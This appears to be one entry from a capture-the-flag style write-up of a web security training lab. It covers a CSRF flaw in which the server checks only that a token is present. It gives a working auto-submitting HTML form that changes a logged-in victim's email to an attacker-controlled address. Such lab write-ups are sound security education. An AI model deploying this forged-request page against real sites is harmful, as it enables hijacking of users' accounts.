3. CSRF where token validation depends on token being present</a>

This web application is vulnerable to CSRF. An API endpoint and its parameters
are well known, and actions can be taken using a user's cookie without verifying
the redirecting page. The browser reuses the cookie for this site and submits a
POST request on the user's behalf, forging the request. Usually a CSRF token is
used to prevent this, however, the server only checks if the token is present,
not if it is correct.

Solution:

```html
<html>
  <body>
    <form
      action="https://3.web-security-academy.net/my-account/change-email"
      method="POST"
    >
      <input
        type="hidden"
        name="email"
        value="pwned&#64;evil&#45;user&#46;net"
      />
    </form>
    <script>
      history.pushState("", "", "/")
      document.forms[0].submit()
    </script>
  </body>
</html>
```
